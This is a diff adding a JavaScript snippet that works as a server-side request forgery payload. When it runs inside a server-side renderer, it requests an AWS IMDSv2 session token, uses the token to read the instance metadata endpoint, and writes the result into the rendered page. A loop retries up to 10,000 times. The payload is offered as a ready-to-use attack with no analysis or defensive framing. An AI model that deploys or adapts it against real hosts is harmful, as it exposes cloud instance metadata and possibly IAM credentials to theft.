@@ -1,0 +1,22 @@
+<script>
+var i=0;
+// 10000 requests is plenty, make sure we don't DoS
+while (i < 10000){
+	var x = new XMLHttpRequest(); 
+	// get AWS IMDSv2 metadata token
+	x.open("PUT", "/latest/api/token", false); 
+	x.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
+	x.send();
+	if (x.status != 404){
+		var y = new XMLHttpRequest();
+		// get metadata with token. Update this URL
+		// to get specific metadata
+		y.open("GET", "/latest/meta-data/", false);
+		y.setRequestHeader("X-aws-ec2-metadata-token", x.responseText);
+		y.send();
+		document.write(y.responseText);
+		break
+	}
+	i++;
+}
+</script>
